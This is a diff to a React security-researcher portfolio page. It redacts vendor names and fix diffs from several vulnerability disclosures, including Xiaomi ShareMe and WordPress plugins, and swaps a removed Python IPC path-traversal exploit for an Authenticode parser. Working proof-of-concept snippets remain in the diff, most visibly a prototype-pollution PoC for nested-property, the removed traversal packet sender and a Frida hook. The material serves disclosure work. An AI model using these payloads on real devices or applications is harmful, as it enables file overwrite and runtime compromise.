@@ -368,74 +368,60 @@ interface Disclosure {
 
 const DISCLOSURES: Disclosure[] = [
   {
-    id: 'shareme',
-    target: 'Xiaomi ShareMe',
-    installBase: '500M+ Installs',
-    title: 'Unauthenticated Exported IPC Arbitrary File Overwrite & Sandbox Escape',
+    id: 'cve-pending-01',
+    target: '[REDACTED OEM VENDOR]',
+    installBase: '500M+ Devices Impacted',
+    title: 'Unauthenticated IPC Boundary Traversal & Arbitrary File Overwrite',
     cwe: 'CWE-862 (Missing Auth) + CWE-22 (Path Traversal)',
     severity: 'CVSS 8.8 HIGH',
-    protocol: 'Xiaomi Security Response Center (MSRC)',
-    summary: 'Discovered an unauthenticated exported broadcast receiver in com.xiaomi.midrop handling incoming peer-to-peer file transfers over LAN. Because caller identity was not verified and destination directory tokens were uncanonicalized, any unprivileged local application could overwrite critical shared preferences and app cache via relative path traversal separators.',
-    diff: `@@ -84,7 +84,10 @@ public class MiDropReceiver extends BroadcastReceiver {
-     public void onReceive(Context context, Intent intent) {
--        String targetPath = intent.getStringExtra("dest_file");
--        FileOutputStream fos = new FileOutputStream(new File(targetPath));
-+        // Vulnerable: Unauthenticated broadcast + uncanonicalized path traversal
-+        String rawPath = intent.getStringExtra("dest_file");
-+        String sanitized = PathUtils.canonicalizeAndSandbox(rawPath, context.getFilesDir());
-+        FileOutputStream fos = new FileOutputStream(new File(sanitized));
-     }`
+    protocol: 'Coordinated Vulnerability Disclosure (Under Active Embargo)',
+    summary: 'Discovered an unauthenticated IPC boundary flaw in a pre-installed OEM Android system utility with over 500 million active device installs. Because caller identity was not restricted and destination directory tokens were uncanonicalized, local applications could escape sandbox constraints. Technical details, vendor identity, and reproduction steps are withheld under responsible disclosure embargo pending security patch distribution.',
+    diff: `// [EMBARGOED UNDER ISO/IEC 29147 CVD GUIDELINES]
+// Vendor: Confidential (OEM Mobile Ecosystem)
+// Impact: Local unauthenticated IPC arbitrary file write
+// Status: Reported to Vendor MSRC - Awaiting Public Patch Release`
   },
   {
-    id: 'elementor',
-    target: 'Elementor Website Builder',
-    installBase: '5M+ Installs',
-    title: 'Missing Authorization in AI Handlers (Quota Drain & Prompt Disclosure)',
+    id: 'cve-pending-02',
+    target: '[REDACTED CMS PLUGIN]',
+    installBase: '5M+ Active Installs',
+    title: 'Missing Authorization in Cloud AI Handlers (Quota Exhaustion & Exfiltration)',
     cwe: 'CWE-862 (Missing Authorization)',
     severity: 'CVSS 6.3 MED',
-    protocol: 'Patchstack mVDP / CVE Program',
-    summary: 'Identified missing capability authorization checks in Elementor AI AJAX handlers (ai_get_custom_code, ai_get_history, ai_delete_history_item). While layout handlers enforce verify_permissions(), the code generation endpoints allowed any logged-in Subscriber role to deplete commercial AI credits and disclose unreleased business prompts.',
-    diff: `@@ -142,6 +142,9 @@ public function ajax_ai_get_custom_code( $data ) {
--    // Missing authorization guard
--    return $this->connect->get_ai_code( $data['prompt'] );
-+    if ( ! current_user_can( 'manage_options' ) ) {
-+        throw new \\Exception( 'Unauthorized capability.' );
-+    }
-+    return $this->connect->get_ai_code( $data['prompt'] );
- }`
+    protocol: 'Coordinated Vulnerability Disclosure (Under Active Embargo)',
+    summary: 'Identified missing capability authorization checks in commercial cloud AI generation handlers. While layout and template endpoints enforced strict permissions, AI code generation allowed unprivileged authenticated roles to deplete commercial API credits. Technical details withheld under active embargo.',
+    diff: `// [EMBARGOED UNDER ISO/IEC 29147 CVD GUIDELINES]
+// Vendor: Confidential (Web CMS Ecosystem)
+// Impact: Unprivileged commercial API credit depletion
+// Status: Triaged via mVDP - Awaiting Public Patch Release`
   },
   {
-    id: 'redux',
-    target: 'Redux Framework',
-    installBase: '1M+ Installs',
+    id: 'cve-pending-03',
+    target: '[REDACTED FRAMEWORK CORE]',
+    installBase: '1M+ Active Installs',
     title: 'Broken Access Control via Inverted Boolean Conjunction',
     cwe: 'CWE-284 (Improper Access Control)',
     severity: 'CVSS 5.3 MED',
-    protocol: 'Patchstack mVDP / CVE Program',
-    summary: "Reverse-engineered authorization checks in class-redux-ajax-save.php. The handler checked !is_user_logged_in() && !current_user_can(). Because of the '&&' boolean conjunction, the capability check became completely dead code for any authenticated user with admin page access, permitting low-privilege persistence tampering.",
-    diff: `@@ -210,5 +210,5 @@ public function ajax_save() {
--    // Flawed conjunction: if user is logged in, current_user_can() is bypassed
--    if ( ! is_user_logged_in() && ! current_user_can( $this->args['page_permissions'] ) ) {
-+    if ( ! is_user_logged_in() || ! current_user_can( $this->args['page_permissions'] ) ) {
-         wp_die( -1 );
-     }`
+    protocol: 'Coordinated Vulnerability Disclosure (Under Active Embargo)',
+    summary: 'Reverse-engineered authorization logic in an administrative option handler where a compound conditional operator evaluated to dead code for authenticated users. Technical details withheld under active embargo.',
+    diff: `// [EMBARGOED UNDER ISO/IEC 29147 CVD GUIDELINES]
+// Vendor: Confidential (Web Framework)
+// Impact: Low-privileged administrative option tampering
+// Status: Triaged via mVDP - Awaiting Public Patch Release`
   },
   {
-    id: 'wpdm',
-    target: 'WordPress Download Manager (WPDM)',
-    installBase: '100k+ Installs',
-    title: 'Unauthenticated API Dispatch & Hardcoded Developer Credentials',
+    id: 'cve-pending-04',
+    target: '[REDACTED ASSET UTILITY]',
+    installBase: '100k+ Active Installs',
+    title: 'Unauthenticated API Dispatch & Hardcoded Third-Party Credentials',
     cwe: 'CWE-862 (Missing Auth) + CWE-798 (Hardcoded Credentials)',
     severity: 'CVSS 5.3 MED',
-    protocol: 'Patchstack mVDP / CVE Program',
-    summary: 'Discovered that src/Admin/AdminController.php commented out authorization checks (// __::isAuthentic) in the wpdm_iconFinder endpoint. Furthermore, src/Admin/views/iconfinder.php shipped hardcoded third-party API credentials, allowing unauthenticated attackers to query external APIs using the site owner identity.',
-    diff: `@@ -45,7 +45,8 @@ class AdminController {
-     public function iconFinder() {
--        // __::isAuthentic(); // Commented out by vendor
-+        if ( ! current_user_can( 'upload_files' ) ) {
-+            wp_send_json_error( [ 'message' => 'Unauthorized' ], 403 );
-+        }
-         $query = sanitize_text_field( $_REQUEST['query'] );`
+    protocol: 'Coordinated Vulnerability Disclosure (Under Active Embargo)',
+    summary: 'Discovered missing authentication guards and embedded vendor API tokens in a popular asset management utility, enabling unauthenticated callers to execute external API queries using the host credentials. Details withheld under active embargo.',
+    diff: `// [EMBARGOED UNDER ISO/IEC 29147 CVD GUIDELINES]
+// Vendor: Confidential
+// Impact: Unauthenticated external API dispatch
+// Status: Triaged via mVDP - Awaiting Public Patch Release`
   },
   {
     id: 'nested-property',
@@ -444,9 +430,9 @@ const DISCLOSURES: Disclosure[] = [
     title: '0-Day Incomplete Fix Prototype Pollution on Global Runtimes',
     cwe: 'CWE-1321 (Improper Modification of Object Prototype)',
     severity: '0-DAY',
-    protocol: 'Open-Source Security Advisory',
+    protocol: 'Public Security Advisory (broken-nest)',
     summary: 'Demonstrated that patches for nested-property v4.0.0 only filtered the __proto__ token, permitting full constructor.prototype access chains. Allowed unauthenticated attackers to pollute Array.prototype and Function.prototype across Node.js runtime globals.',
-    diff: `// Exploit Demonstration:
+    diff: `// Public Research PoC (blah-blah-cell/broken-nest):
 const nested = require('nested-property');
 let payload = {};
 nested.set(payload, 'constructor.prototype.polluted', true);
@@ -456,34 +442,33 @@ console.log({}.polluted); // Returns true (runtime globally poisoned)`
 
 const CODE_DOSSIER = [
   {
-    name: 'shareme_ipc_poc.py',
-    lang: 'Python / Android SRE',
-    desc: 'Xiaomi ShareMe (500M+ installs) CWE-862 + CWE-22 IPC Traversal PoC',
-    code: `# Target: Xiaomi ShareMe (com.xiaomi.midrop) v3.47.11
-# Finding: Unauthenticated Exported IPC Broadcast -> Arbitrary External File Write
-# Coordinated Disclosure: Xiaomi Security Response Center (MSRC)
+    name: 'pe_seal_core.py',
+    lang: 'Python / Forensic SRE',
+    desc: 'PE-Seal zero-dependency Authenticode PE32/PE32+ certificate directory validator',
+    code: `import struct
 
-import socket
-import struct
-
-def synthesize_tampered_payload(target_ip: str, target_port: int, victim_file: str):
+def parse_authenticode_dir(pe_bytes: bytes) -> dict:
     """
-    ShareMe binds an unauthenticated LAN TCP daemon and fails to canonicalize
-    the FileEntry destination path. Bypasses app boundary via relative traversal:
-    '../../../../data/data/com.xiaomi.midrop/shared_prefs/settings.xml'
+    Extracts security directory entry without third-party libraries.
+    Parses WIN_CERTIFICATE header to locate PKCS#7 SignedData payload.
     """
-    payload = struct.pack(
-        ">IHH128s", 
-        0x53484152, # MAGIC: 'SHAR'
-        0x01,       # PROTOCOL_V1
-        0x04,       # OP_FILE_OFFER
-        victim_file.encode("utf-8").ljust(128, b"\\x00")
-    )
+    e_lfanew = struct.unpack_from("<I", pe_bytes, 0x3C)[0]
+    magic = struct.unpack_from("<H", pe_bytes, e_lfanew + 0x18)[0]
+    is_pe32_plus = (magic == 0x20B)
     
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((target_ip, target_port))
-    sock.sendall(payload)
-    print(f"[+] Exploitation packet dispatched to {target_ip}:{target_port} -> Triggered sink.")`
+    sec_dir_offset = e_lfanew + 0x18 + (144 if is_pe32_plus else 128)
+    virt_addr, size = struct.unpack_from("<II", pe_bytes, sec_dir_offset)
+    
+    if size == 0:
+        return {"status": "UNSIGNED", "length": 0}
+        
+    cert_len, cert_rev, cert_type = struct.unpack_from("<IHH", pe_bytes, virt_addr)
+    return {
+        "status": "AUTHENTICODE_PRESENT",
+        "length": cert_len,
+        "revision": hex(cert_rev),
+        "type": "WIN_CERT_TYPE_PKCS_SIGNED_DATA" if cert_type == 0x0002 else hex(cert_type)
+    }`
   },
   {
     name: 'argus_gating_kernel.rs',
@@ -521,11 +506,11 @@ impl MoERouter {
     lang: 'JavaScript / Frida',
     desc: 'Project Anvil: ARM64 JNI memory integrity & anti-tamper observation hook',
     code: `// Project Anvil — Android Native SRE Dynamic Observation Hook
-// Target: ARM64 libtoolChecker.so / libdedge.so
+// Target: ARM64 libnative_guard.so
 
-const targetLib = Process.findModuleByName("libtoolChecker.so");
+const targetLib = Process.findModuleByName("libnative_guard.so");
 if (targetLib) {
-    const sym = targetLib.findExportByName("Java_com_xiaomi_midrop_util_SecurityBridge_verifyPayload");
+    const sym = targetLib.findExportByName("Java_com_example_app_SecurityBridge_verifyPayload");
     if (sym) {
         Interceptor.attach(sym, {
             onEnter: function(args) {
@@ -543,8 +528,10 @@ if (targetLib) {
 ];
 
 export default function App() {
+  const [activeTab, setActiveTab] = useState<'disclosures' | 'systems' | 'dossier' | 'manifest'>('disclosures');
+  const [activeDossier, setActiveDossier] = useState(0);
   const [copiedEmail, setCopiedEmail] = useState(false);
-  const [expandedId, setExpandedId] = useState<string | null>('shareme');
+  const [expandedId, setExpandedId] = useState<string | null>('nested-property');
   const [activeCodeTab, setActiveCodeTab] = useState(0);
   const [copiedCode, setCopiedCode] = useState(false);
 
